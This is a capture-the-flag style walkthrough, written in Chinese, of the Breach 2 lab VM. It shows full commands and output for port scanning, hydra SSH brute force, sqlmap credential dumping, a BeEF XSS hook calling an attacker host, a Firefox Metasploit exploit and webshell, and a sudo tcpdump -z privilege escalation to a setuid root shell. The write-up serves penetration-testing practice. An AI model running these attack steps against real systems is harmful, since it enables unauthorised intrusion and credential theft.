> VirtualBox users: if the screen goes black on boot once past the grub screen make sure to go to settings ---> general, and make sure it says Type: Linux Version: Debian 64bit

## port scan

```sh
nmap -sT --min-rate=8899 -p- 192.168.110.151 -oN nmap_result/port
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 03:21 EST
Nmap scan report for 192.168.110.151 (192.168.110.151)
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
111/tcp   open  rpcbind
46218/tcp open  unknown
65535/tcp open  unknown
```

```sh
# Nmap 7.94SVN scan initiated Sat Feb 15 03:21:43 2025 as: nmap -sT -sC -sV -O -p111,46218,65535 -oN nmap_result/detils 192.168.110.151
Nmap scan report for 192.168.110.151 (192.168.110.151)
Host is up (0.00099s latency).

PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34339/udp   status
|   100024  1          41699/udp6  status
|   100024  1          44535/tcp6  status
|_  100024  1          46218/tcp   status
46218/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e (ED25519)
MAC Address: 08:00:27:81:C7:9B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

只开放ssh服务

## ssh

```sh
└─$ ssh root@192.168.110.151 -p65535
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   # 
#############################################################################
```

提示：peter的密码是：`in the source`

```sh
hydra -L users.txt -P passwd.txt ssh://192.168.110.151:65535 -t 4 -vV -e ns
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-15 08:00:57
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:1/p:8), ~2 tries per task
[DATA] attacking ssh://192.168.110.151:65535/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://peter@192.168.110.151:65535
[INFO] Successful, password authentication is supported by ssh://192.168.110.151:65535
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "peter" - 1 of 8 [child 0] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "" - 2 of 8 [child 1] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "Consulting" - 3 of 8 [child 2] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "consulting" - 4 of 8 [child 3] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "Peter" - 5 of 8 [child 1] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "in the source" - 6 of 8 [child 0] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "inthesource." - 7 of 8 [child 2] (0/0)
[ATTEMPT] target 192.168.110.151 - login "peter" - pass "inthesource" - 8 of 8 [child 1] (0/0)
[STATUS] attack finished for 192.168.110.151 (waiting for children to complete tests)
[65535][ssh] host: 192.168.110.151   login: peter   password: inthesource
1 of 1 target successfully completed, 1 valid password found
```

密码：`inthesource`

`ssh peter@192.168.110.151 -p65535`

登录不上，但是输入密码后，卡了很久，可能是加载了一些服务

再次扫描服务

```sh
nmap -sT --min-rate=8899 -p- 192.168.110.151
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 08:16 EST
Nmap scan report for 192.168.110.151 (192.168.110.151)
Host is up (0.012s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
51208/tcp open  unknown
65535/tcp open  unknown
```

开放了80，http服务

## web

目录扫描

```sh
dirb http://192.168.110.151/            

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 15 08:07:00 2025
URL_BASE: http://192.168.110.151/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.151/ ----
==> DIRECTORY: http://192.168.110.151/blog/
==> DIRECTORY: http://192.168.110.151/images/
+ http://192.168.110.151/index.html (CODE:200|SIZE:468)
+ http://192.168.110.151/server-status (CODE:403|SIZE:303)
```

存在xss，sql漏洞

![image-20250215211901731](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215211901731.png)

```
sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 --batch
```

![image-20250215212158933](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215212158933.png)

```
[*] blog
[*] information_schema
[*] mysql
[*] oscommerce
[*] performance_schema
```

```sh
sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 -D mysql -T user -C User,Password --dump
```

没其他用户，root的密码是空

```
Database: mysql
Table: user
[4 entries]
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | <blank>                                   |
| root             | <blank>                                   |
| root             | <blank>                                   |
| debian-sys-maint | *D0C78CEFE547A41E829542C969E697104594B2C0 |
+------------------+-------------------------------------------+
```

`oscommerce`数据库

```sh
sqlmap -u http://192.168.110.151/blog/index.php?search=1 --level 3 -D oscommerce -T osc_administrators -C user_name,user_password --dump
```

```
Database: oscommerce
Table: osc_administrators
[1 entry]
+-----------+-------------------------------------+
| user_name | user_password                       |
+-----------+-------------------------------------+
| admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |
+-----------+-------------------------------------+
```

爆破出来是：32admin

然后尝试写shell，并没有权限

```
searchsploit blogphp -m 17640
```

这还有个xss

```sh
How to exploit:
1- Go there : http://localhost/blogphp/register.html.
2- Put in the Username field the XSS Code.  Example:<META http-equiv="refresh" content="0;URL=http://www.google.com">  .
3- Put anything in the other field ( Password & E-mail).
4- Now anyone go there : http://localhost/blogphp/members.html will redirected to google.com OR exploit your XSS Code.
```

用户名处，存在xss，然后访问members.html

![image-20250215213136771](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213136771.png)

用beef-xss测试

`<script src="http://192.168.110.7:3000/hook.js"></script>`

![image-20250215213409465](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213409465.png)

等待后台点击

![image-20250215213247928](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213247928.png)

发现火狐浏览器版本很低，`Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0`

```sh
searchsploit firefox 15
Mozilla Firefox 5.0 < 15.0.1 - __exposedProps__ XCS Code Execution (Metasploit)
```

xss，代码执行

![image-20250215213850545](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215213850545.png)

然后使用beef-xss，跳转到`http://192.168.110.7:8080/test`

![image-20250215214642395](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215214642395.png)

![image-20250215215449858](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215215449858.png)

然后使用`post/multi/manage/shell_to_meterpreter`，升级一下shell

![image-20250215215417219](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215215417219.png)

```sh
$ cat firefox.sh
#!/bin/bash

xvfb-run --auto-servernum --server-num=1 /opt/firefox/firefox http://192.168.110.151/blog/members.html
```

`/etc/ssh/sshd_config`

```
UsePAM yes
AllowUsers peter
ForceCommand /usr/bin/startme
AddressFamily inet
```

`ForceCommand` 是一个用于强制执行特定命令的配置选项，通常是在 SSH 服务器的配置文件中进行设置。它的主要用途是在用户连接时，无论他们尝试执行什么操作，服务器都会强制执行指定的命令。

```
meterpreter > cat /usr/bin/startme
#!/bin/bash

sudo /etc/init.d/apache2 start &> /dev/null
```

```sh
$ whoami
peter
$ sudo -l
Matching Defaults entries for peter on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on breach2:
    (root) NOPASSWD: /etc/init.d/apache2
```

## 提权

查看网络连接

```sh
$ netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:51208           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::33041                :::*                    LISTEN      -               
```

本地存在一个2323端口

```sh
$ telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: 
```

`29 45'46" N 95 22'59" W `一个经纬度

![image-20250215223059174](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215223059174.png)

`Houston Police Department Memorial`

然后尝试，milton的密码是`Houston `

```
$ telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: milton
Password: 
Last login: Sat Feb 15 17:29:07 EST 2025 from localhost on pts/1
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W 
3
2
1
Whose stapler is it?
```

搜索关键词`Whose stapler is it?`

```sh
$ grep -rino 'Whose stapler is it?' /usr
/usr/local/bin/cd.py:16:Whose stapler is it?
$ cat /usr/local/bin/cd.py
#!/usr/bin/python

import signal
import time
import os

s = signal.signal(signal.SIGINT, signal.SIG_IGN)

countdown=3

while countdown >0:
        time.sleep(1)
        print(countdown)
        countdown -=1
if countdown <1:
        question = raw_input("Whose stapler is it?")
if question == "mine":
        os.system("echo 'Woot!'")
else:

        os.system("kill -9 %d"%(os.getppid()))
        signal.signal(signal.SIGINT, s)
```

输入`mine`

```sh
$ telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: milton
Password: 
Last login: Sat Feb 15 17:38:48 EST 2025 from localhost on pts/1
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W 
3
2
1
Whose stapler is it?mine
Woot!
milton@breach2:~$ id
uid=1002(milton) gid=1002(milton) groups=1002(milton)
```

成功切换到`milton`

```sh
milton@breach2:~$ sudo -l
Sorry, user milton may not run sudo on breach2.
milton@breach2:~$ netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:51208           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::8888                 :::*                    LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::33041                :::*                    LISTEN      - 
```

又开放了8888端口

```sh
nmap -sT -p8888 192.168.110.151 -sV -sC    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 09:41 EST
Nmap scan report for 192.168.110.151 (192.168.110.151)
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
8888/tcp open  http    nginx 1.6.2
|_http-title: Index of /
|_http-server-header: nginx/1.6.2
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     15-Jun-2016 20:50  oscommerce/
| 867   15-Jun-2016 18:09  index.nginx-debian.html
|_
```

```sh
milton@breach2:~$ find / -writable 2>/dev/null | grep -v 'proc' | grep -v 'sys' | grep -v 'dev'
/var/lock
/var/tmp
/var/tmp/kdecache-milton
/var/tmp/kdecache-milton/plasma-wallpapers
/var/tmp/kdecache-milton/plasma-wallpapers/usr
/var/tmp/kdecache-milton/plasma-wallpapers/usr/share
/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images
/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images/desktop-base
/var/tmp/kdecache-milton/plasma-wallpapers/usr/share/images/desktop-base/lines-wallpaper_1920x1080.svg_#000000_2_800x600.png
/var/tmp/kdecache-milton/ksycoca4stamp
/var/tmp/kdecache-milton/Personal Calendarrc
/var/tmp/kdecache-milton/plasma-svgelements-default_v2.0
/var/tmp/kdecache-milton/plasma_theme_default_v2.0.kcache
/var/tmp/kdecache-milton/favicons
/var/tmp/kdecache-milton/ksycoca4
/var/tmp/kdecache-milton/icon-cache.kcache
/var/lib/php5/sessions
/var/www/html2/oscommerce/includes/work
```

`/var/www/html2/oscommerce/includes/work`可写目录，可以拿到webshell

![image-20250215224606085](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215224606085.png)

```sh
blumbergh@breach2:/home/bill$ sudo -l
sudo -l
Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

```sh
blumbergh@breach2:/home/bill$ echo '#!/bin/sh' > 1.sh
blumbergh@breach2:/home/bill$ echo 'cp /bin/bash /home/bill/bash' >> 1.sh
blumbergh@breach2:/home/bill$ echo 'chmod +s /home/bill/bash' >> 1.sh
echo 'chmod +s /home/bill/bash' >> 1.sh
blumbergh@breach2:/home/bill$ cat 1.sh
#!/bin/sh
cp /bin/bash /home/bill/bash
chmod +s /home/bill/bash
```

```sh
blumbergh@breach2:/home/bill$ chmod +x 1.sh
blumbergh@breach2:/home/bill$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /home/bill/1.sh -Z root
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1

blumbergh@breach2:/home/bill$ ls
1.sh
bash
blumbergh@breach2:/home/bill$ ls -la
total 1020
drwxr-xr-x 2 blumbergh blumbergh    4096 Feb 15 17:49 .
drwxr-xr-x 5 root      root         4096 Jun 19  2016 ..
-rwxr-xr-x 1 blumbergh blumbergh      64 Feb 15 17:48 1.sh
-rwsr-sr-x 1 root      root      1029624 Feb 15 17:49 bash
blumbergh@breach2:/home/bill$ ./bash -p
./bash -p
id
uid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) egid=0(root) groups=0(root),1001(blumbergh),1004(fin)
whoami
root
```

![image-20250215225125630](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215225125630.png)